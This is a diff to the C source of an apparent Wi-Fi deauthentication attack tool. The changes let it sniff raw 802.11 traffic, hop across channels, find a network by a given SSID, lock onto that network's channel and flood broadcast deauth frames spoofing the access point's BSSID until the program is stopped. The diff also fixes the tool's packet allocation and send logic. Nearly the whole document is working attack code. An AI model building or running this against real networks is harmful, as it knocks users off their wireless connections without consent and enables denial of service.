@@ -20,12 +20,17 @@ int iw_dev_set(struct iw_dev *dev)
 	struct sockaddr_ll sll;
 	struct packet_mreq mreq;
     int fd;
+	struct timeval tv;
+	tv.tv_sec=0;
+	tv.tv_usec=100000;
 
 	if ((fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL)))<0)
     {
         perror("socket ");
         return -1;
     }
+	setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, (char*)&tv, sizeof(struct timeval));
+
     dev->fd_in = fd;
 
 	if((dev->fd_out = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL)))<0)
@@ -165,14 +170,8 @@ int get_ap_info(struct iw_dev *dev, struct ap_info *api)
 	struct info_element *beacon_ie;
 
 	r = recv(dev->fd_in, buf, sizeof(buf), 0);
-	if(r<0)
-	{
-		perror("recv ");
+	if(r<=0)
 		return -1;
-	}
-	else if (r==0)
-		return -1;
-	
 	rt_hdr = (struct radiotap_hdr *)buf;
 	if (sizeof(*rt_hdr) >= r || rt_hdr->len >= r)
 		return -1;
@@ -304,61 +303,53 @@ int iw_set_channel(struct iw_dev *dev, int chan)
 void channel_set(uint32_t *cs, uint8_t chan) { cs[chan/32] |= 1 << (chan % 32);}
 int channel_isset(uint32_t *cs, uint8_t chan) {return !!(cs[chan/32] & (1 << (chan % 32)));}
 
-void make_deauth_packet(void *pack, struct iw_dev *dev, struct access_point *ap)
+void make_deauth_packet(struct deauth_packet **packet, struct iw_dev *dev, struct access_point *ap)
 {
-	struct deauth_packet *packet;
-	uint16_t *reason;
-	pack = malloc(sizeof(packet)+sizeof(*reason));
-	memset(pack, 0 ,sizeof(packet) + sizeof(*reason));
+	*packet = (struct deauth_packet*)malloc(sizeof(struct deauth_packet)+2);
+	memset(*packet, 0 ,sizeof(struct deauth_packet)+2);
 
-	packet = (struct deauth_packet*)pack;
-	packet->rt_hdr.len = sizeof(packet->rt_hdr) + sizeof(packet->w_rt_data);
-	packet->rt_hdr.present = RADIOTAP_F_PRESENT_RATE | RADIOTAP_F_PRESENT_TX_FLAGS;
+	(*packet)->rt_hdr.len = sizeof((*packet)->rt_hdr) + sizeof((*packet)->w_rt_data);
+	(*packet)->rt_hdr.present = RADIOTAP_F_PRESENT_RATE | RADIOTAP_F_PRESENT_TX_FLAGS;
 
-	packet->w_rt_data.rate = 2;
-	packet->w_rt_data.tx_flags = RADIOTAP_F_TX_FLAGS_NOACK | RADIOTAP_F_TX_FLAGS_NOSEQ;
+	(*packet)->w_rt_data.rate = 2;
+	(*packet)->w_rt_data.tx_flags = RADIOTAP_F_TX_FLAGS_NOACK | RADIOTAP_F_TX_FLAGS_NOSEQ;
 
-	packet->deauth.fc.subtype = FRAME_CONTROL_SUBTYPE_DEAUTH;
+	(*packet)->deauth.fc.subtype = FRAME_CONTROL_SUBTYPE_DEAUTH;
 	
-	memset(packet->deauth.dest_mac, '\xff', IFHWADDRLEN);
-	memcpy(packet->deauth.src_mac, ap->info.bssid, IFHWADDRLEN);
-	memcpy(packet->deauth.bssid, ap->info.bssid, IFHWADDRLEN);
-	reason = (uint16_t*)(packet->deauth.frame_body);
+	memset((*packet)->deauth.dest_mac, '\xff', IFHWADDRLEN);
+	memcpy((*packet)->deauth.src_mac, ap->info.bssid, IFHWADDRLEN);
+	memcpy((*packet)->deauth.bssid, ap->info.bssid, IFHWADDRLEN);
 
-	*reason = 7; 
-
-	packet->deauth.sc.sequence = ap->sequence++;
+	// Reason code 7 = Class 3 frame
+	(*packet)->deauth.frame_body[0] = 7;
+	(*packet)->deauth.sc.sequence = ap->sequence++;
 }
 
 int send_deauth(struct iw_dev *dev, struct access_point *ap)
 {
-	struct deauth_packet *deauth;
-	void *pack;
-	int r;
+	struct deauth_packet *packet;
+	ssize_t r;
 
-	make_deauth_packet(pack, dev, ap);
-	deauth = (struct deauth_packet *)pack;
-
-	/* send deauth */
+	make_deauth_packet(&packet, dev, ap);
 
 	ap->sequence %= 4096;
 	do {
-		r = send(dev->fd_out, pack, sizeof(*pack), 0);
+		r = send(dev->fd_out, packet, sizeof(*packet) + 2, 0);
 		if(r < 0)
 		{
 			perror("send ");
-			free(pack);
+			free(packet);
 			return -1;
 		}
 		else if (r > 0)
 		{
-			r -= deauth->rt_hdr.len;
+			r -= packet->rt_hdr.len;
 			if (r <= 0)
 				r = 0;
 		}
 	} while (r == 0);
 
-	free(pack);
+	free(packet);
 
 	return 0;
 }
@@ -380,7 +371,20 @@ void *deauth_thread(void *arg)
 		ap = ta->apl->head;
 		while(ap != NULL && !g_wifi_end_signal)
 		{
-			send_deauth(ta->dev, ap);
+			if(ta->SSID == NULL)
+				continue;
+			if(!strcmp(ap->info.essid, ta->SSID))
+			{
+				printf("\"%s\" found!!\n",ap->info.essid);
+
+				pthread_mutex_lock(ta->ap_find_stop_mutex);
+				ta->ap_find_stop =1;
+				iw_set_channel(ta->dev, ap->info.chan);
+				pthread_mutex_unlock(ta->ap_find_stop_mutex);
+
+				while(!g_wifi_end_signal)
+					send_deauth(ta->dev, ap);
+			}		
 			ap = ap->next;
 		}
 	}
@@ -390,15 +394,17 @@ void *deauth_thread(void *arg)
 int main(int argc, char ** argv)
 {
     char * ifname = argv[1];
+	char * SSID = argv[2];
     struct iw_dev dev;
     struct ap_info api;
 	struct ap_list apl;
-	time_t tm, s_tm, e_tm;
+	struct timeval s_tv, n_tv;
+	suseconds_t msec;
 	uint32_t chans[8]={0,};
 	int n, ret, chan;
 	pthread_t thread_id;
 	struct deauth_thread_args ta;
-	pthread_mutex_t list_mutex;
+	pthread_mutex_t list_mutex, ap_find_stop_mutex;
 	
 	for (n = 1; n<=13; n++)
 		channel_set(chans,n);
@@ -406,17 +412,15 @@ int main(int argc, char ** argv)
 		channel_set(chans,n);
 	for (n = 100; n<=140; n+=4)
 		channel_set(chans,n);
-	for (n = 149; n<=161; n+=4)
+	for (n = 149; n<=165; n+=4)
 		channel_set(chans,n);
-	channel_set(chans,165);
 
     iw_init_dev(&dev);
 	strncpy(dev.ifname, ifname, sizeof(dev.ifname)-1);
     if(iw_dev_set(&dev)<0)
         return -1;
 	
-	chan = 0;
-	n = 0;
+	chan = n = 0;
 	do 
 	{
 		chan = (chan % CHANNEL_MAX) + 1;
@@ -427,10 +431,7 @@ int main(int argc, char ** argv)
 		/* if fails try next channel */
 	} while(++n < CHANNEL_MAX && ret < 0);
 	if (ret < 0)
-	{
-		printf("chan error");
 		return -1;
-	}
 	
 	memset(&api, 0, sizeof(api));
 	memset(&apl, 0, sizeof(apl));
@@ -440,26 +441,39 @@ int main(int argc, char ** argv)
 
 	pthread_mutex_init(&list_mutex, NULL);
 	ta.list_mutex = &list_mutex;
+	pthread_mutex_init(&ap_find_stop_mutex, NULL);
+	ta.ap_find_stop_mutex = &ap_find_stop_mutex;
+	ta.ap_find_stop = 0;
 
-	pthread_create(&thread_id, NULL, deauth_thread, &ta);
-
-	tm = time(NULL);
+	ta.SSID = SSID;
 
 	signal(SIGINT, INThandler);
 
-	while(!g_wifi_end_signal)
-	{
-		if(get_ap_info(&dev, &api)==-1) continue;
+	pthread_create(&thread_id, NULL, deauth_thread, &ta);
 
-		pthread_mutex_lock(&list_mutex);
-		add_ap(&apl, &api);
-		pthread_mutex_unlock(&list_mutex);
+	printf("SSID founding...\n\n");
 
-		n = 0;
-		if(time(NULL)-tm >= 1)
+	gettimeofday(&s_tv, NULL);
+
+	while(!g_wifi_end_signal && !ta.ap_find_stop)
+	{		
+		if(!get_ap_info(&dev, &api))
 		{
-			do 
-			{
+			pthread_mutex_lock(&list_mutex);
+			add_ap(&apl, &api);
+			pthread_mutex_unlock(&list_mutex);
+		}
+
+		gettimeofday(&n_tv, NULL);
+		if(n_tv.tv_usec > s_tv.tv_usec)
+			msec = n_tv.tv_usec - s_tv.tv_usec;
+		else
+			msec = s_tv.tv_usec - n_tv.tv_usec;
+		
+		if (msec >= 100000)
+		{
+			n = 0;
+			do {
 				chan = (chan % CHANNEL_MAX) + 1;
 				if (channel_isset(chans, chan))
 					ret = iw_set_channel(&dev, chan);
@@ -468,14 +482,13 @@ int main(int argc, char ** argv)
 				/* if fails try next channel */
 			} while(++n < CHANNEL_MAX && ret < 0);
 			if (ret < 0) 
-			{
-				printf("error");
 				return -1;
-			}
+			gettimeofday(&s_tv, NULL);
 		}
 	}
-
 	pthread_join(thread_id, NULL);
+	printf("Exiting..\n");
+	pthread_mutex_destroy(&list_mutex);
 	iw_dev_unset(&dev);
 	free_ap_list(&apl);
 
